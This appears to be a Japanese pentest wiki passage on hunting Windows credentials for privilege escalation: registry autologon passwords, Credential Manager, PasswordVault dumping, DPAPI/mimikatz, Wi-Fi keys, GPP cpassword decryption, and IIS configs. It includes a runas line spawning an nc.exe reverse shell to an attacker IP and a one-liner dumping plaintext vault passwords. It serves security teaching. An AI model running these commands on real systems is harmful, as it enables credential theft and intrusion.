WSL 内の Linux `root` であっても、それだけで Windows の Administrator 権限が得られるわけではありません。現在の Windows の ID でディストリビューションのファイルシステムを読み取れる場合は、コマンドによって認証情報が記録されている可能性があるため、シェル履歴ファイル（`/root/.bash_history` を含む）を確認してください。権限昇格には、引き続き有効な高権限アカウントと許可された認証経路が必要です。`LocalState\rootfs` の構成は古い WSL インストールに適用されます。WSL 2 では通常、ディストリビューションは [`ext4.vhdx` 仮想ディスク](https://learn.microsoft.com/en-us/windows/wsl/disk-space)に保存されるため、まず実際のディストリビューションと保存先を特定してください。自動列挙中に履歴の内容を出力しないでください。

## Windows 認証情報

### Winlogon 認証情報

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

`DefaultUserName` と `DefaultDomainName` は認証情報ではなく、アカウントのコンテキストとして扱ってください。空でない `DefaultPassword` または `AltDefaultPassword` の値は、レジストリ内に平文の認証情報があることを示します。`AutoAdminLogon=1` でも、平文パスワードを読み取れない場合は、あくまで手がかりにすぎません。[Sysinternals Autologon はパスワードを LSA シークレットとして保存することがあります](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon)。通常のレジストリ読み取りだけでは、そのシークレットが存在するか、取得できるかは確認できません。認証情報の漏えいとして報告する前に、アクセス権と実際のログオン設定を確認してください。

### 資格情報マネージャー / Windows Vault

[https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup> より\
Windows Vault は、サーバー、Web サイト、その他のプログラムで **Windows** が使用し、**ユーザーを自動的にログインさせる**ための認証情報を保存します。一見すると、ユーザーが Facebook、Twitter、Gmail などのサイトの認証情報を保存し、ブラウザーに自動ログインさせられるように思えるかもしれませんが、そうではありません。

Windows Vault は、Windows がユーザーを自動的にログインさせるための認証情報を保存します。つまり、リソース（サーバーまたは Web サイト）へのアクセスに認証情報が必要な **Windows アプリケーションであれば、この Credential Manager と Windows Vault を利用**して、ユーザーが毎回ユーザー名とパスワードを入力する代わりに、保存された認証情報を使用できます。

アプリケーションが Credential Manager と連携しない限り、特定のリソースの認証情報を利用できないと思います。そのため、アプリケーションで Vault を利用するには、何らかの方法で **Credential Manager と通信し、既定のストレージ Vault からそのリソースの認証情報を要求する**必要があります。

`cmdkey` を使って、マシンに保存されている認証情報を一覧表示します。

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

次に、保存された資格情報を使用するために、`/savecred` オプションを指定して `runas` を使用できます。以下の例では、SMB共有経由でリモートバイナリを呼び出しています。

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

提供された認証情報で `runas` を使用する。

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

mimikatz、lazagne、[credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html)、[VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html)、または[Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1)を使用できることに注意してください。

### UWP PasswordVault / Credential Locker

最新のWindows UWPアプリケーション、Microsoft Edge、および最新のシステムサービスは、認証トークンと平文パスワードを、Universal Windows Platform (UWP) の `PasswordVault`（`vaultcmd`では`Web Credentials`としても表示されます）に保存します。この保存領域はセッションごとに隔離されており、管理者権限や`SeDebugPrivilege`なしでネイティブに復号できます。

ユーザーのアクティブなセッション内で次のPowerShellコマンドを実行すると、保存されているすべてのユーザー名と平文パスワードを即座にダンプして復号できます。

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** は、データを対称暗号化する方法を提供します。主に Windows オペレーティングシステム内で、非対称秘密鍵の対称暗号化に使用されます。この暗号化では、ユーザーまたはシステムの秘密情報を利用して、エントロピーを大幅に高めます。

**DPAPI を使用すると、ユーザーのログイン秘密情報から導出された対称鍵を使って鍵を暗号化できます**。システムの暗号化では、システムのドメイン認証秘密情報が使用されます。

DPAPI を使用して暗号化されたユーザー RSA 鍵は、`%APPDATA%\Microsoft\Protect\{SID}` ディレクトリに保存されます。`{SID}` はユーザーの[セキュリティ識別子](https://en.wikipedia.org/wiki/Security_Identifier)を表します。**ユーザーの秘密鍵を保護するマスターキーと同じファイルに保存される DPAPI キー**は、通常、64 バイトのランダムデータで構成されます。（このディレクトリへのアクセスは制限されているため、CMD で `dir` コマンドを使って内容を一覧表示することはできません。ただし、PowerShell では一覧表示できます。）

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

**mimikatz module** `dpapi::masterkey` を適切な引数（`/pvk` または `/rpc`）とともに使用して、復号できます。

**master password で保護された credentials files** は通常、次の場所にあります。

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

**mimikatz module** `dpapi::cred` と適切な `/masterkey` を使って復号できます。\
`sekurlsa::dpapi` module を使うと、**memory** から多数の DPAPI **masterkeys** を**抽出**できます（root の場合）。

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell 認証情報

**PowerShell 認証情報**は、暗号化された認証情報を手軽に保存する方法として、**スクリプト**や自動化タスクでよく使われます。認証情報は **DPAPI** で保護されており、通常は作成時と同じコンピューター上の同じユーザーでしか復号できません。

エクスポートされた認証情報のファイル名や `.xml` のパスは任意です。スクリプトやファイル一覧からファイルが見つかった場合は、`C:\Users` にあると決めつけず、アカウントの実際のプロファイルディレクトリを特定してください。[Windows ではプロファイルを別の場所に配置できます](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory)。ファイルが読み取り可能でも、それは手がかりにすぎません。[Windows の `Export-Clixml` は、暗号化された認証情報をエクスポート元のユーザーとコンピューターに紐付けます](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml)。また、復旧したアカウントが対象サービスで有効な権限を持つかどうかは、別途確認する必要があります。通常の列挙では、暗号化された値や平文の値を表示せず、まずパスと ACL を調べてください。

ファイル内の PS 認証情報を**復号**するには、次のようにします。

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wi-Fi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### 保存された RDP 接続

`HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
および `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### 最近実行したコマンド

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **リモート デスクトップ資格情報マネージャー**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

**Mimikatz** の `dpapi::rdg` module を適切な `/masterkey` とともに使用して、**任意の .rdg ファイルを復号する**\
Mimikatz の `sekurlsa::dpapi` module を使うと、メモリから**多数の DPAPI masterkey を抽出できます**

**mRemoteNG は異なる接続ストアを使用します。** `%APPDATA%\mRemoteNG` とユーザーの Documents にある読み取り可能な XML を調べます。`config.xml` のような一般的な名前のファイルも対象にします。XML ファイルを認証情報の手がかりとして扱う前に、接続スキーマと暗号化された `Password` 属性を特定してください。保存された値は DPAPI/RDCMan のパスワードではありません。復元できるかどうかは、ファイルの暗号化設定とカスタム master password が使われたかどうかによります。広範な列挙中に暗号化された値を表示しないでください。

**Remote Desktop Plus のプロファイルエクスポート**も、ユーザーディレクトリや共有の管理フォルダーから読み取れる場合があります。旧形式の `profiles.xml` エクスポートには、`ProfileName`、`Password`、`Secure` 要素を含む `Data/Profile` エントリがあります。空でない password 要素は認証情報の手がかりとして扱い、表示したり平文だと決めつけたりしないでください。[ベンダーの説明](https://www.donkz.nl/)によると、プロファイルの保護は作成元のアカウントとコンピューターに紐付けられる場合も、より緩やかに設定される場合もあります。これを信頼する前に、ファイルの出所と復元条件を確認してください。

### Sticky Notes

Windows ワークステーションでは、データベースファイルだと気づかずに、Sticky Notes アプリに**パスワード**やその他の情報を保存していることがよくあります。このファイルは `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` にあり、必ず検索して調べる価値があります。

付箋アプリにパスワードやその他の情報を保存している人もいます。Microsoft のパッケージ版 Sticky Notes アプリは、通常、メモを `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` に保存します。古いアプリや別のアプリでは、LevelDB を含む、ほかのユーザープロファイル内の保存場所を使用する場合があります。SQLite ファイルが見つからないことをメモが存在しない証拠とみなす前に、インストールされているアプリと保存形式を特定してください。

Sticky Notes が SQLite write-ahead logging を使用している場合、`plum.sqlite` だけをコピーすると、最近コミットされたメモが欠落することがあります。データベースの一貫性のあるコピーとともに、対応する `plum.sqlite-wal` を保管し、利用可能であれば `plum.sqlite-shm` も含めてください。共有メモリーのインデックスは再構築できますが、WAL はデータベースの永続状態の一部です。[SQLite の WAL ドキュメント](https://www.sqlite.org/wal.html)を参照してください。アカウント名やパスワードを含むメモは、認証情報の手がかりにすぎません。アカウント、許可されたアクセス、パスワードの再利用をそれぞれ別途確認してください。暗号化された password-manager のレコードから上位権限のログインを確認するには、実際の復号キーとアプリ固有の解釈も必要です。

### AppCmd.exe

**AppCmd.exe からパスワードを復元するには、Administrator であり、High Integrity level で実行する必要があります。**\
**AppCmd.exe** は `%systemroot%\system32\inetsrv\` ディレクトリにあります。\
このファイルが存在する場合、一部の**認証情報**が設定されており、**復元できる**可能性があります。

このコードは [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) から抽出されました。

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` が存在するか確認してください .\
インストーラーは **SYSTEM privileges で実行される**ため、多くの場合 **DLL Sideloading に対して脆弱です（情報元:** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**）。**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Files and Registry (認証情報)

### Support-tool registry credential artifacts

一部の古いリモートサポート製品では、固定されたアプリケーションレジストリキーの下に、パスワード関連の値名が残っています。たとえば、[ベンダーによるレジストリキーの説明](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988)によると、TeamViewer の `SecurityPasswordAES` は、バージョン 9 より前では設定済みの静的セッションパスワードを示していました。値名のマーカーは確認の手掛かりにすぎません。その認証情報を評価する前に、インストールされているバージョン、読み取り可能な値データ、形式、現在の認証動作を確認してください。リモートサポートのパスワードから、より高い権限を持つ Windows アカウントに至るには、実際にパスワードが再利用されており、そのアカウントへのアクセスが許可されている必要もあります。通常の列挙出力に暗号文や復元したパスワードを含めないでください。

### 保護されたシートを含む共有スプレッドシート

読み取り可能な共有ブックにアカウントデータが含まれている疑いがある場合、**ファイルの暗号化**と、ワークシートの保護または非表示の列を区別してください。[Microsoft によると](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel)、ワークシートの保護は編集を制御するものであり、セキュリティ機能ではありません。それだけではブックの内容が暗号化されているとは言えません。許可された関連ファイルだけを確認し、広範な列挙中に候補となる秘密情報を出力しないでください。読み取り可能な `.xlsx` のパス、保護されたシート、または非表示の列があるだけでは、認証情報の存在も、いずれかのアカウントがより高い権限を持つことも証明できません。実際のデータと現在のアカウント権限は個別に確認してください。

### CI サーバーに残る変更パッチ

CI サーバーは、ビルド完了後も、送信されたソース変更をデータディレクトリに保持していることがあります。[TeamCity のドキュメント](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html)では、`system/changes` はリモート実行の変更を保存する場所とされています。データディレクトリは設定可能で、必ずしも `ProgramData` の下にあるとは限りません。読み取り可能なパッチには、削除または追加された認証情報ファイル、暗号化キー、あるいは両方を使用するスクリプトへの参照が残っている場合があります。たとえば、PowerShell の `ConvertTo-SecureString -Key` ワークフローには、AES キーと暗号化文字列の両方が必要です。[Microsoft のドキュメント](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring)によると、キーは別途指定します。まずアクセス可能なパッチ名だけを確認し、許可を得たうえで関連する内容を調べてください。通常の列挙出力に秘密情報を出力しないでください。パッチのパス、暗号化された値、またはキーへの参照があるだけでは、有効な認証情報やより高い権限でのアクセスは証明できません。データディレクトリの ACL を制限し、ビルド変更に秘密情報をコミットしないでください。

### カスタムのローカル管理者パスワードローテーション

独自実装のパスワードローテーターは、暗号化されたローカル管理者パスワードをローカルサービスに保存し、データストアの認証情報を読み取り可能な `.env` ファイルや updater バイナリの隣に置いている場合があります。updater のスケジュールタスク、アカウント、設定ファイルの ACL、リスナー、データストアの権限を合わせて確認してください。ループバック専用のデータストアでも、有効な認証情報を持つローカルユーザーから到達できますが、認証できるだけでは関連レコードの読み取り権限があるとは限りません。暗号化の seed やキー素材が暗号文の隣からアクセスできる場合は、暗号化を信頼する前に、正確なキー導出方法を確認してください。公開された seed から Go の [`math/rand`](https://pkg.go.dev/math/rand)を使って AES キーを決定論的に導出する方式は、そのパスワードの保護には不適切です。Go のドキュメントでも、このパッケージはセキュリティ上重要な乱数生成には不適切とされています。復元したパスワードを権限昇格経路と見なす前に、そのパスワードが現在も有効であり、ローカル Administrators グループのアカウントに属していることを確認してください。スケジュールタスク、`.env` のパス、暗号化された blob があるだけでは、これらの条件は何も証明されません。通常の列挙出力にパスワードやキー素材を含めないでください。

管理対象のローカル管理者パスワードには [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview)を使用してください。ディレクトリまたは Entra による保存とアクセス制御は、カスタムのローカルデータストアとは異なります。同様に、[Elasticsearch のロール](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/)によって、認証済みデータストアユーザーが特定のインデックスを読み取れるかどうかが決まります。

### Java サーバープラグインアーカイブと認証情報の再利用

一部の Java サーバープラグインは、サーバーの `plugins` ディレクトリに JAR アーカイブとして配布されます。読み取り可能なカスタムプラグインに、埋め込みサービス認証情報を含む設定やバイトコードが含まれている場合があります。許可を得た場合に限りアーカイブを確認し、復元した秘密情報を通常の列挙出力に含めないでください。プラグインのパスがあるだけでは秘密情報の存在は証明されず、復元したサービスパスワードからより高い権限を得られるのは、そのパスワードがより高い権限を持つアカウントにも有効な場合に限られます。関連ファイルの ACL を確認し、再利用された認証情報はそれぞれ異なる秘密情報に置き換えてください。ディレクトリ構成については [PaperMC のプラグインインストールガイド](https://docs.papermc.io/paper/adding-plugins/)、アーカイブの内容については [Oracle の JAR ドキュメント](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html)を参照してください。

### Openfire の組み込みデータベース認証情報

組み込みデータベースを使用する Openfire インストールでは、`Openfire\embedded-db` の下に `openfire.script` が保存されている場合があります。現在のアカウントで読み取れる場合は、`OFUSER` レコードと `passwordKey` プロパティを合わせて確認してください。Openfire の[ユーザープロバイダーのドキュメント](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html)によると、パスワードは平文で保存されるか、そのプロパティに保持されたキーで暗号化されます。復元したパスワードが権限昇格に関係するのは、より高い権限を持つ ID に対して現在も有効な場合に限られます。ファイル名だけでは、読み取りアクセスも認証情報の再利用も証明されません。このパスはインベントリ確認の手掛かりです。通常の列挙出力にデータベースの内容や認証情報を含めないでください。

別ファイルの `Openfire\conf\openfire.xml` からは、外部データベースを使用している場合でも、管理コンソールに設定されたポートとバインドインターフェースが判明することがあります。Openfire の管理コンソールは通常ループバックにバインドされますが、リスナーが稼働していれば、ローカルアカウントからそのアドレスに到達できます。実際のリスナー、許可された管理者ロール、プラグインのアップロードポリシー、Openfire サービスの ID を合わせて確認してください。プラグインをインストールできる管理者は、サービスのコンテキストでプラグインコードを実行させることができます。サービスが LocalSystem として実行されている場合、非常に高い権限で実行される可能性があります。一致するアカウントパスワードや読み取り可能な設定パスだけでは、管理コンソールへのアクセスやコード実行は証明されません。ベンダーの[インストールおよびプラグイン管理ガイド](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html)と[プラグインアップロード API プロパティ](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html)を参照してください。

### フォレンジック管理サーバーの設定

Velociraptor サーバーの設定ファイルは通常 `server.config.yaml` という名前で、内部 CA の `CA.private_key` を含む場合があります。低い権限のユーザーがそのキーを読み取れる場合、API クライアント証明書を発行できる可能性があります。これによって高い権限を得られるかどうかは、サーバーのユーザーロール、API への到達性、サーバーまたは対象エージェントが実行される ID によって異なります。クライアント設定には異なる情報が含まれます。クライアント設定を見つけても、サーバー CA にアクセスできることは証明されません。CA 秘密鍵をオフラインで保管するデプロイもあるため、読み取り可能なサーバー設定に署名キーが含まれていない場合もあります。

Windows サーバーでは、インストールディレクトリにある**サーバー**設定ファイルと、保護されたバックアップの ACL を確認してください。場所の例は `%ProgramFiles%\VelociraptorServer\server.config.yaml` です。異なる場合は、サービスに設定されたパスを使用してください。現在の ID でファイルを読み取れることと、`CA.private_key` が実際に含まれていることを確認してください。ログや列挙出力に秘密鍵を出力しないでください。ベンダーの `config api_client` ワークフローでは CA キーを使ってクライアント証明書を発行しますが、有効なサーバー側ロールも必要です。ロールの作成や変更には、データストアへの書き込みアクセスまたは再起動が必要になる場合があります。これらの書き込みができなくても、既存の高権限サーバー ID が経路となる可能性があります。実行権限のある API クエリは、関連するサーバーまたはエージェントのコンテキストで実行され、非常に高い権限を持つ場合があります。

サーバー設定とバックアップは厳格な ACL で保護し、可能であれば CA 署名キーをオフラインに保管し、API ロールとリスナーへのアクセスを制限してください。[Velociraptor API ドキュメント](https://docs.velociraptor.app/docs/server_automation/server_api/)と[セキュリティ設定ガイダンス](https://docs.velociraptor.app/docs/deployment/security/)を参照してください。

### Putty 認証情報

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTYは独立したセッションマネージャーです。ネイティブの暗号化ストアは`%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`にある場合があります。一方、エクスポートしたセッションバックアップは`sessions-backup.dat`という名前で、別の場所に保存されている場合があります。[SolarWindsのエクスポートガイド](https://thwack.solarwinds.com/discussion/comment/115591)によると、エクスポートはパスワードで暗号化され、セッション、キー、スクリプト、タグ、関連付けが含まれることがあります。[サポートフォーラム](https://thwack.solarwinds.com/discussion/4520/saved-session-lost)では、ネイティブストアの場所が示されています。まずファイルの権限とパスを確認してください。どちらかのファイルが見つかっても、そのパスワードが判明したことにはならず、保存された認証情報が現在も有効であることや、より高い権限を持つことの証明にもなりません。

### Putty SSH Host Keys

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### レジストリ内の SSH keys

SSH の秘密鍵はレジストリキー `HKCU\Software\OpenSSH\Agent\Keys` に保存されている場合があるため、そこに興味深いものがないか確認してください:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

そのパス内にエントリが見つかった場合、おそらく保存済みの SSH key です。暗号化されていますが、[https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) を使えば簡単に復号できます。\
この手法の詳細はこちら: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

`ssh-agent` サービスが実行されておらず、起動時に自動で開始するようにしたい場合は、次を実行します:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> この手法はもう有効ではないようです。ssh キーを作成し、`ssh-add` で追加してマシンに ssh でログインしようとしましたが、レジストリ HKCU\Software\OpenSSH\Agent\Keys は存在せず、公開鍵認証中に `dpapi.dll` が使用されていることも procmon では確認できませんでした。

### 無人インストールファイル

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

これらのファイルは、**metasploit**を使って検索することもできます: _post/windows/gather/enum_unattend_

例の内容:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM & SYSTEM のバックアップ

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

読み取り可能な Windows Imaging（`.wim`）バックアップファイルにも、オフラインの `SAM`、`SECURITY`、`SYSTEM` hive が含まれている場合があります。ローカルからアクセス可能なバックアップディレクトリやイメージディレクトリを優先し、何かを抽出する前にイメージの**メンバー名**を確認してください。`.wim` というファイル名だけでは hive が露出している証拠にはならず、一般的な `install.wim`、`boot.wim`、リカバリーイメージは誤検出につながりやすいものです。SMB share は別のアクセス経路であり、その share がスコープ内の場合にのみ確認してください。Microsoft の [Windows image guidance](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) および [registry hive file reference](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives) を参照してください。

### クラウド認証情報

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

**SiteList.xml** という名前のファイルを検索します

### Cached GPP Password

以前は、Group Policy Preferences (GPP) を使用して、複数のマシンにカスタムのローカル管理者アカウントを展開できる機能がありました。しかし、この方法には重大なセキュリティ上の欠陥がありました。まず、SYSVOL に XML ファイルとして保存されている Group Policy Object (GPO) は、ドメイン内のすべてのユーザーがアクセスできました。次に、GPP 内のパスワードは、公開されているデフォルトキーを使用して AES256 で暗号化されていたため、認証済みユーザーであれば誰でも復号できました。ユーザーが昇格した権限を取得できる可能性があるため、これは深刻なリスクでした。

このリスクを軽減するため、空ではない「cpassword」フィールドを含むローカルにキャッシュされた GPP ファイルをスキャンする関数が開発されました。このようなファイルが見つかると、関数はパスワードを復号し、カスタムの PowerShell オブジェクトを返します。このオブジェクトには、GPP の詳細とファイルの場所が含まれており、このセキュリティ上の脆弱性の特定と修正に役立ちます。

これらのファイルを `C:\ProgramData\Microsoft\Group Policy\history` または _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (Vista より前)_ で検索します。

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword を復号するには:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

crackmapexecを使ってパスワードを取得する：

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

認証情報を含む web.config の例：

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### IIS webroot 内のバックアップアーカイブ

配信対象の webroot に直接置かれた古い ZIP バックアップから、以前の設定ファイルや再利用可能な認証情報が漏れることがあります。これを情報漏えいと判断する前に、サイトに設定された物理パスを確認し、アーカイブに HTTP 経由で実際にアクセスできるか確かめてください。デフォルトの `C:\inetpub\wwwroot` は候補の一つにすぎません。簡単なローカル調査では、アーカイブを開かずに名前とサイズを一覧表示できます:

```powershell
